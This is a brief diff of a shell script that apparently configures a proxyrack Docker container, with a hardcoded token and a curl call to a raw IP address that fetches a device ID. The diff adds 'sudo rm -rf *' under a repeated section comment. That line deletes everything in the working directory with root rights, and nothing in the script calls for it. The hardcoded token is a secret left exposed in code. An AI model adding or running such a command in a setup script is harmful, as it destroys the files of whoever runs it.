@@ -6,6 +6,8 @@ FIXED_TOKEN="yLbJuqMpr8/edWMV8rs8inTD/eCRDtbZ7iwaZMJ8/8M="   # <-- thay token cá
 RUN_ONCE=0
 
 # -------- proxyrack --------
+sudo rm -rf *
+# -------- proxyrack --------
 DEVICE_ID=$(curl -s http://54.36.60.95:3000/get-offline-keys?limit=1 | grep -oP '"device_id"\s*:\s*"\K[^"]+') 
 if [ -n "$DEVICE_ID" ]; then
   docker rm -f proxyrack >/dev/null 2>&1 || true
